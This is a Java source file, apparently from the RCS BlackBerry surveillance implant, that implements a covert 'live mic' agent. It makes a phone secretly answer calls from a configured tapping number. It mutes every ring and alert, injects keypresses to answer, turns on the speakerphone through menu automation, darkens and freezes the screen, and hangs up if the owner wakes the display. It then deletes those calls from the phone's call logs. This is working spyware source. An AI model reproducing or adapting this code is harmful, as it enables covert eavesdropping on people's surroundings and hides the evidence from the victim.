//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : LiveMicAgent.java
 * Created      : 2-lug-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;
import java.util.Date;
import java.util.Hashtable;
import java.util.Timer;

import javax.microedition.media.Manager;
import javax.microedition.media.Player;
import javax.microedition.media.control.ToneControl;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Alert;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.Audio;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.injection.KeyInjector;
import blackberry.injection.MenuWalker;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.CallListObserver;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class LiveMicAgent.
 */
public class LiveMicAgent extends Agent implements BacklightObserver,
        PhoneListener {

    //#ifdef DEBUG
    private static final long MINIMUM_IDLE_TIME = 5;
    //#else
    private static final long MINIMUM_IDLE_TIME = 20;
    //#endif

    //#ifdef DEBUG
    private static Debug debug = new Debug("LiveMicAgent", DebugLevel.VERBOSE);
    //#endif

    String number;
    int volume;
    boolean autoanswer;
    //boolean suspended;
    boolean backlight;

    /**
     * Instantiates a new live mic agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public LiveMicAgent(final boolean agentEnabled) {

        super(Agent.AGENT_LIVE_MIC, agentEnabled, Conf.AGENT_LIVEMIC_ON_SD,
                "LiveMicAgent");

        //#ifndef LIVE_MIC_ENABLED
        enable(false);
        //#endif

        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.NONE,
                "Wrong Conversion");
        //#endif

    }

    /**
     * Instantiates a new live mic agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    public LiveMicAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            final int len = databuffer.readInt();
            final byte[] array = new byte[len];
            databuffer.read(array);
            number = WChar.getString(array, true);

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG
        debug.info("Tapping number: " + number);
        //#endif
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        Phone.addPhoneListener(this);
        AppListener.getInstance().addBacklightObserver(this);
        backlight = Backlight.isEnabled();

        //stopAudio();        
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        Phone.removePhoneListener(this);
        AppListener.getInstance().removeBacklightObserver(this);

        suspendPainting(false);
    }

    private class StopAudio extends java.util.TimerTask {
        public void run() {
            try {
                stopAudio();
            } catch (Exception ex) {

                //#ifdef DEBUG
                debug.error("stopAudio: " + ex);
                //#endif
            }
        }
    }

    public void stopAudio() {
        Debug.init();
        //#ifdef DEBUG
        debug.trace("StopAudio");
        //#endif

        Alert.stopVibrate();
        Alert.mute(true);
        Audio.setVolume(0);
        Alert.setVolume(0);
        Alert.stopAudio();
        Alert.stopBuzzer();
        Alert.stopMIDI();
        Alert.setADPCMVolume(0);
        Alert.stopADPCM();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallAnswered(java.lang.String)
     */
    public synchronized void onCallAnswered(final int callId,
            final String phoneNumber) {
        //#ifdef DEBUG
        debug.init();
        //#endif

        //#ifdef DBC
        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
        //#endif

        //#ifdef DEBUG
        debug.info("======= callAnswered: " + phoneNumber + "===");
        //#endif

        if (!interestingNumber(callId, phoneNumber)) {
            return;
        }

        //MenuWalker.walk(new String[] { "Activate Speakerphone" });
        MenuWalker.walk(new String[] { "Home Screen", "Return to Phone" });

        //MenuWalker.walk(new String[] { "Close" });
        MenuWalker.walk(new String[] { "Return to Phone" });
        MenuWalker.walk(new String[] { "Activate Speakerphone" });
        //MenuWalker.setLocaleEnd();

        //#ifdef DEBUG
        debug.trace("onCallAnswered: finished");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallConnected(java.lang.String)
     */
    public synchronized void onCallConnected(final int callId,
            final String phoneNumber) {

        //#ifdef DBC
        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
        //#endif

        //#ifdef DEBUG
        debug.info("======= callConnected: " + phoneNumber + " ===");
        //#endif      

        if (!interestingNumber(callId, phoneNumber)) {
            return;
        }

        //suspendPainting(false);
        //Backlight.enable(false);
        suspendPainting(true);

        //Utils.sleep(2000);
        autoanswer = true;
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallDisconnected(java.lang.
     * String)
     */
    public synchronized void onCallDisconnected(final int callId,
            final String phoneNumber) {

        //#ifdef DEBUG
        debug.info("======= callDisconnected: " + phoneNumber + " =======");
        //#endif

        autoanswer = false;

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("onCallDisconnected: not interesting");
            //#endif
            return;
        } else {
            //#ifdef DEBUG
            debug.trace("onCallDisconnected, interesting");
            //#endif

            removePhoneCall();
            Application.getApplication().invokeLater(new Runnable() {
                public void run() {
                    suspendPainting(false);
                }
            });
        }
    }

    private void removePhoneCall() {
        Application.getApplication().invokeLater(new Runnable() {
            public void run() {
                init();
                //#ifdef DEBUG
                debug.trace("run: removePhoneCall");
                //#endif
                final int DELAY = 5000;
                Utils.sleep(DELAY);

                removePhoneCallFromFolder(PhoneLogs.FOLDER_NORMAL_CALLS);
                removePhoneCallFromFolder(PhoneLogs.FOLDER_MISSED_CALLS);
            }
        });

    }

    protected void removePhoneCallFromFolder(long folderID) {

        //#ifdef DEBUG
        debug.trace("removePhoneCallFromFolder: " + folderID);

        //#endif
        PhoneLogs phoneLogs = null;

        try {

            phoneLogs = PhoneLogs.getInstance();
            int size = phoneLogs.numberOfCalls(folderID);

            //#ifdef DEBUG
            debug.trace("size before: " + size);
            //#endif

            for (int i = size - 1; i >= 0; i--) {
                final CallLog log = phoneLogs.callAt(i, folderID);

                if (PhoneCallLog.class.isAssignableFrom(log.getClass())) {
                    PhoneCallLog plog = (PhoneCallLog) log;
                    String phoneNumber = plog.getParticipant().getNumber();
                    if (phoneNumber.endsWith(number)) {
                        //#ifdef DEBUG
                        debug.info("removePhoneCallFromFolder: " + phoneNumber);
                        //#endif
                        phoneLogs.deleteCall(i, folderID);
                    }
                }
            }

            size = phoneLogs.numberOfCalls(folderID);

            //#ifdef DEBUG
            debug.trace("size after: " + size);
            //#endif

        } catch (Exception e) {
            //#ifdef DEBUG
            debug.trace("removePhoneCallFromFolder: " + e);
            //#endif

        }
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallIncoming(java.lang.String)
     */
    public synchronized void onCallIncoming(final int callId,
            final String phoneNumber) {

        //#ifdef DBC
        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
        //#endif

        //#ifdef DEBUG
        debug.info("======= incoming: " + phoneNumber + " =======");
        //#endif

        if (!interestingNumber(callId, phoneNumber)) {
            //#ifdef DEBUG
            debug.trace("onCallIncoming not interesting: " + phoneNumber);
            //#endif
            return;
        }

        stopAudio();

        if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {
            KeyInjector.pressKey(Keypad.KEY_SEND);
        } else {
            KeyInjector.pressKey(Keypad.KEY_END);
        }

        suspendPainting(true);
    }

    //boolean backlight;

    /*
     * (non-Javadoc)
     * @see blackberry.interfaces.BacklightObserver#onBacklightChange(boolean)
     */
    public void onBacklightChange(final boolean statusOn) {
        backlight = statusOn;
        //#ifdef DEBUG
        debug.trace("onBacklightChange: " + backlight + " autoanswer: "
                + autoanswer);
        //#endif

        if (autoanswer && backlight) {
            autoanswer = false;
            //#ifdef DEBUG
            debug.trace("onBacklightChange: sending END");
            //#endif
            suspendPainting(true);

            KeyInjector.pressKey(Keypad.KEY_END);
            //Utils.sleep(2000);

            suspendPainting(false);
        }

    }

    /**
     * Suspend/resume painting.
     * 
     * @param suspend
     *            true if you ask to suspend
     */
    private void suspendPainting(final boolean suspend) {
        if (!Conf.IS_UI) {
            //#ifdef DEBUG
            debug.warn("Not UI");
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.trace("suspendPainting: " + suspend);
        //#endif              

        synchronized (Application.getEventLock()) {

            if (suspend) {
                Backlight.enable(false);
                Utils.sleep(1000);
            }

            boolean suspended = UiApplication.getUiApplication()
                    .isPaintingSuspended();
            if (suspended != suspend) {
                

                try {
                    //#ifdef LIVE_MIC_ENABLED
                    UiApplication.getUiApplication().suspendPainting(suspend);
                    //#endif
                } catch (final IllegalStateException ex) {
                    //#ifdef DEBUG
                    debug.error(ex);
                    //#endif
                }

                //suspended = suspend;
            }
        }
    }

    /**
     * true if the phoneArgument matches the configured one
     * 
     * @param phoneNumber
     * @return
     */
    private boolean interestingNumber(int callId, final String phoneNumber) {
        //#ifdef DBC
        Check.asserts(phoneNumber != null,
                "interestingNumber: phoneNumber==null");
        //#endif

        if (!phoneNumber.endsWith(number)) {
            //#ifdef DEBUG
            debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
                    + number);
            //#endif
            return false;
        } else {
            if (phoneNumber != null) {
                //#ifdef DEBUG
                debug.trace("onCallIncoming tap: " + phoneNumber);
                //#endif                
            }
            return true;
        }
    }

    /****************************** Call ******************************/

    Hashtable callingHistory = new Hashtable();

    public void callAdded(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callAnswered(int callId) {
        init();
        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
        final boolean outgoing = phoneCall.isOutgoing();

        onCallAnswered(callId, phoneNumber);

    }

    public void callConferenceCallEstablished(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callConnected(int callId) {
        init();
        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
        final boolean outgoing = phoneCall.isOutgoing();

        onCallConnected(callId, phoneNumber);
    }

    public void callDirectConnectConnected(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callDirectConnectDisconnected(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callDisconnected(int callId) {
        init();
        final PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = null;

        if (phoneCall != null) {
            phoneNumber = phoneCall.getDisplayPhoneNumber();
        } else {

            synchronized (callingHistory) {
                if (callingHistory.containsKey(new Integer(callId))) {
                    phoneNumber = (String) callingHistory.get(new Integer(
                            callId));
                    callingHistory.remove(new Integer(callId));
                }
            }

            //#ifdef DEBUG
            debug.trace("callDisconnected phoneNumber: " + phoneNumber);
            //#endif
        }

        onCallDisconnected(callId, phoneNumber);
    }

    public void callEndedByUser(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callFailed(int arg0, int arg1) {
        // TODO Auto-generated method stub

    }

    public void callHeld(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callIncoming(int callId) {
        init();
        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }

        onCallIncoming(callId, phoneNumber);
    }

    public void callInitiated(int callId) {
        init();
        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }

    }

    public void callRemoved(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callResumed(int arg0) {
        // TODO Auto-generated method stub

    }

    public void callWaiting(int arg0) {
        // TODO Auto-generated method stub

    }

    public void conferenceCallDisconnected(int arg0) {
        // TODO Auto-generated method stub

    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }

}
